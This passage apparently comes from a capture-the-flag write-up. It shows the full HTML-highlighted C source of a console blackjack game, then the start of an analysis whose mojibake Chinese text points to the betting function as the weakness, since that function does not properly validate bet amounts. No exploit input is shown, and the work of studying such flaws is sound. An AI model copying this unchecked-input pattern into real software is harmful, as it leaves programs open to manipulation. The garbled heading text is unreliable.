class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Generates random card</span><span class="token punctuation">{</span>     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>     random_card <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>            <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>         <span class="token keyword">return</span> l<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function   </span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Plays game</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// holds value of player_total</span>     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// counter for asking user to hold or stay (aka game turns)</span>     <span class="token keyword">char</span> choice3<span class="token punctuation">;</span>     cash <span class="token operator">=</span> cash<span class="token punctuation">;</span>     <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCash: $%d\n"</span><span class="token punctuation">,</span>cash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints amount of cash user has</span>     <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random card</span>     player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes player total</span>     p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints player total</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes and prints dealer total</span>     <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prompts user to enter bet amount</span>     <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//While loop used to keep asking user to hit or stay at most twenty-one times</span>                  <span class="token comment" spellcheck="true">//  because there is a chance user can generate twenty-one consecutive 1's</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If user total is 21, win</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is over 21, loss</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWoah Buddy, You Went WAY over.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is less than 21, ask to hit or stay</span>         <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nWould You Like to Hit or Stay?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>             <span class="token punctuation">{</span>                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please Enter H to Hit or S to Stay.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Hit, continues</span>             <span class="token punctuation">{</span>                  <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span>                 p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Is dealer total is 21, loss</span>                  <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer total is over 21, win</span>                  <span class="token punctuation">{</span>                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has Went Over!. You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Stay, does not continue</span>             <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span><span class="token punctuation">,</span> player_total<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>          <span class="token punctuation">}</span>             i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//While player total and dealer total are less than 21, re-do while loop </span>     <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End While Loop</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> z<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>      z<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is 10 or less, keep that value</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span>z<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is more than 11, change value to 10</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span>      <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>     dealer_total <span class="token operator">=</span> dealer_total <span class="token operator">+</span> d<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe Dealer Has a Total of %d"</span><span class="token punctuation">,</span> dealer_total<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints dealer total</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function </span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token punctuation">{</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//If stay selected, dealer continues going</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">>=</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">>=</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is more than dealer's total, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is less than dealer's total, loss</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer's total is more than 21, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>         dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>cash <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Once user has zero remaining cash, game ends and prompts user to play again</span>     <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You Are Bankrupt. Game Over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to play again</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWould You Like To Play Again?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nPlease Enter Y for Yes or N for No\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nBYE!!!!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fpresults<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//File pointer is fpresults</span>    fpresults <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>RESULTS<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Creates file and writes into it</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpresults <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// what to do if file missing from directory</span>    <span class="token punctuation">{</span>               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nError: File Missing\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>          <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t RESULTS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\n\t---------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Won %d Times\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nYou Have Lost %d Times\n"</span><span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nKeep Playing and Set an All-Time Record!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">fclose</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><h3 id="ÂàÜÊûê-11"><a href="#ÂàÜÊûê-11" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÈóÆÈ¢ò‰∏ªË¶ÅÂá∫Ëá™bettingÂáΩÊï∞</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token 